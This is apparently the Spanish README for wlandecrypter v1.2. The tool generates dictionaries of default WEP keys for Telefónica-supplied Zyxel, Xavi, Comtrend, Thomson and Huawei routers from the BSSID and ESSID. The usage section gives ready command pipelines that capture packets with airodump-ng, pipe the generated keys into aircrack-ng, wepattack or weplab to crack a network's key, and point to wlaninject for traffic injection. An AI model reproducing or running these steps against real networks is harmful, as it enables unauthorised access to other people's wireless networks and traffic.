          _                 _                            _              
         | |               | |                          | |            
__      _| | __ _ _ __   __| | ___  ___ _ __ _   _ _ __ | |_ ___ _ __  
\ \ /\ / / |/ _` | '_ \ / _` |/ _ \/ __| '__| | | | '_ \| __/ _ \ '__| 
 \ V  V /| | (_| | | | | (_| |  __/ (__| |  | |_| | |_) | ||  __/ |    
  \_/\_/ |_|\__,_|_| |_|\__,_|\___|\___|_|   \__, | .__/ \__\___|_|    
                                              __/ | |                             
 WLANDECRYPTER v1.2                          |___/|_|                             
................................................................................



Descripción:	Generador de diccionario de claves por defecto para los routers
		de Timofonik Zyxel, Xavy, Comtrend, Thomson y Huawei.


-------------------------------------------------------------------------------------------- 
-------------------------------------------------------------------------------------------- 

USO

uso: wlandecrypter [-l] <bssid> <essid> [output_file opcion]

	-l : lista en pantalla todos los routers conocidos.

opcion:
	-e : genera diccionario experimental para routers desconocidos.
	-a : genera diccionario para todos los routers conocidos y una WLAN_XX.

   
   <essid> = WLAN_??, para crear diccionario con todas las posibilidades.


--------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------- 

OBSERVACIONES

- Las opciones -e y -a no se ejecutan a la vez, wlandecrypter sólo llevará a cabo la 
  primera que encuentre en la línea de comandos.

- Opción -e experimental: Ya que en algunos de los últimos routers las claves siguen el patrón
  X112233xxxxAB para por ejemplo un router Xavi con mac 11:22:33:xx:xx:xx y WLAN_AB, e igual en
  algunos Comtrend, Zyxel, etc, porque no probar y ver que pasa con otros que puedan aparecer y no
  estén aun en la lista.

- Opción -a: Genera las claves de un WLAN_XX para todos los routers conocidos sin tener en cuenta
  la bssid introducida. Por ejemplo puede servir para un router no conocido, distinto a los entregados
  por el operador, pero en el que se haya mantenido la configuración del original.

- Un diccionario con la opción -a y wlan_?? ocupará más de 4 GB de disco duro, ¿realmente
  necesitas eso Y PUEDES MANEJARLO?.

- Con la opción -e y wlan_?? el diccionario será de unos 670 MB.

-------------------------------------------------------------------------------------------- 
-------------------------------------------------------------------------------------------- 

EJEMPLOS

- Ejemplo1: wlandecrypter 00:11:22:33:44:55 wlan_aa prueba -e

  Genera Diccionario 'prueba'con C001122xxxxAA, X001122xxxxAA, Z001122xxxxAA, T001122xxxxAA y H001122xxxxAA


- Ejemplo2: wlandecrypter 00:11:22:33:44:55 wlan_aa prueba2 -a 

  Genera el diccionario 'prueba2' para cada BSSID, es decir, para cada router conocido y WLAN_AA, 
  no importa que pongamos como <bssid> no se usará. El diccionario ocupará 19,2 MB en disco duro.

-------------------------------------------------------------------------------------------- 
-------------------------------------------------------------------------------------------- 

Descarga

 http://www.wifiway.org/archivos/wlandecrypter-1.2.tar.gz

 Incluye código fuente y fichero ejecutable wlandecrypter ya compilado en ubuntu.

-------------------------------------------------------------------------------------------- 
-------------------------------------------------------------------------------------------- 

INSTALACION

Compilación:
 make clean && make



Instalación:
 sudo make install



 Más info -> Foro http://www.seguridadwireless.net/


................................................................................
* Fichero:	wlandecrypter.c
* Autor:	Nilp0inteR (nilp0inter2k6[at]gmail[dot]com)
* Fecha:	23-03-2006  
*
* Actualizado:		22-11-2006 por nilp0inter
* Modificado v0.6 :	15-12-2007 por *dudux    dudux[at]elhacker[dot]net
* Modificado v0.7 :	22-11-2008 por *dudux    dudu[at]seguridadwireless[dot]net
* Modificado v0.8 :	12-04-2009 por *dudux    dudu[at]seguridadwireless[dot]net
* Modificado v1.0 :	10-05-2009 por *dudux  // bea vuela muy alto...el cielo es nuestro niña
* Modificado v1.1 :	18-05-2009 por *dudux     Añadida funcion para ESSIDs cambiados 
*
* Modificado:		www.seguridadwireless.net    
*
* 
* Actualizado v1.2b:	18-11-2009 Niroz&NiñoMelon.	Añadidas opciones '-l', '-e' y '-a'. Añade router
*							Xavi E0:91:53.	También se eliminó la constante MAXINDEX
*							y el código relacionado con ella.
*
* Actualizado v1.2:	08-12-2009 Niroz&NiñoMelon.	Añadidas opciones '-l', '-e' y '-a'. Añade routers Comtrend,
*							Xavi, Thomson y Huawei. Se eliminó la constante MAXINDEX y el
*							código relacionado con ella.
*
*
*
*
* Este programa es software libre; puedes redistribuirlo y/o modificarlo
* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
* por la Free Software Foundation; en su version numero 2, o (bajo tu 
* criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt.
* 
* Este programa se distribuye SIN GARANTIA de ningun tipo. USALO bajo tu proio riesgo.
*
* Observaciones: wlandecrypter es multiplataforma, solo las últimas versiones están empaquetadas
*                  para  linux y  versiones de la Livecd WIFIWAY y WIFISLAX.
*                  Hoy en día estan para todo el mundo.
*
*                 * Wlandecrypter 0.7 para  PDAs (Zaurus) gracias a burton de seguridadwireless.
*                 * Wlandecrypter 0.5 para Macintosh.
*                            --->http://wiki.adictolinux.org/index.php/Wlandecrypter_en_Mac_Os_X
*                 * Wlandecrypter 0.5 para windows no se nada,creo que nilp0inter compiló hasta la v0.5
*                
*
* wlandecrypter 1.2 para windows y Macintosh en foro.seguridadwireless.net o compila este mismo código.
* 
*
* Mira también:  wlaninject , wlandestroy , wepattack , weplab y aircrack-ng 



#Niroz&Melon 10/12/2009.

--------------------------------------------------------------------------------------------

***********************************************************************************
***********************************************************************************
          _                 _                            _              __   ___  
         | |               | |                          | |            /_ | / _ \ 
__      _| | __ _ _ __   __| | ___  ___ _ __ _   _ _ __ | |_ ___ _ __   | || | | |
\ \ /\ / / |/ _` | '_ \ / _` |/ _ \/ __| '__| | | | '_ \| __/ _ \ '__|  | || | | |
 \ V  V /| | (_| | | | | (_| |  __/ (__| |  | |_| | |_) | ||  __/ |     | || |_| |
  \_/\_/ |_|\__,_|_| |_|\__,_|\___|\___|_|   \__, | .__/ \__\___|_|     |_(_)___/ 
                                              __/ | |                             
                                             |___/|_|                             

***********************************************************************************
***********************************************************************************

                   
                             _       _           _            
                          /\| |/\   | |         | |           
      _ __   ___  _ __    \ ` ' / __| |_   _  __| |_   ___  __
     | '_ \ / _ \| '__|  |_     _/ _` | | | |/ _` | | | \ \/ /
     | |_) | (_) | |      / , . \ (_| | |_| | (_| | |_| |>  < 
     | .__/ \___/|_|      \/|_|\/\__,_|\__,_|\__,_|\__,_/_/\_\
     | |                                                      
     |_|                                                      

***********************************************************************************


****************************
Para compilar wlandecrypter:
****************************

wget http://www.wifiway.org/archivos/wlandecrypter-1.0.tar.gz
tar zxvf wlandecrypter-1.0.tar.gz
cd wlandecrypter-1.0/
make clean && make 
su
make install



***************
Para usarlo....
***************
Hay 3 maneras : 1) con aircrack-ng 
                2) con wepattack
                3) con weplab


1)  
airodump-ng -w captura --channel 6 ath0
wlandecrypter 00:11:22:33:44:55 WLAN_00 diccionario00.txt
aircrack-ng -b 00:11:22:33:44:55 -w diccionario00.txt captura.cap

o

airodump-ng -w captura --channel 6 ath0
wlandecrypter 00:11:22:33:44:55 WLAN_00 | aircrack-ng -b 00:11:22:33:44:55 -K captura.cap -w -

2)
airodump-ng -w captura --channel 6 ath0
wlandecrypter 00:11:22:33:44:55 WLAN_00 | wepattack -f captura.cap

3)
airodump-ng -w captura --channel 6 ath0
wlandecrypter 00:11:22:33:44:55 WLAN_00 |  weplab --key 128 -y --bssid 00:11:22:33:44:55 captura.cap



Cualquiera es buena.
Con wepattack y weplab sólo se precisa 1 ivs mientras que aircrack-ng necesita 4 ó 5 ivs.
En los casos de doble diccionario se recomienda usar aircrack-ng + wlandecrypter.


Si no obtenéis ivs deberéis gastar wlaninject.

Echale un ojo al codigo  
v0.7 -----> http://codepad.org/ZXRZvCvz 
v0.8 -----> http://codepad.org/tFEcR59y
v1.0 -----> http://codepad.org/2MbolklX
v1.1 -----> http://codepad.org/ApmfMyJH

Visita  http://www.seguridadwireless.net/
                                           
    
contacta dudu@seguridadwireless.net
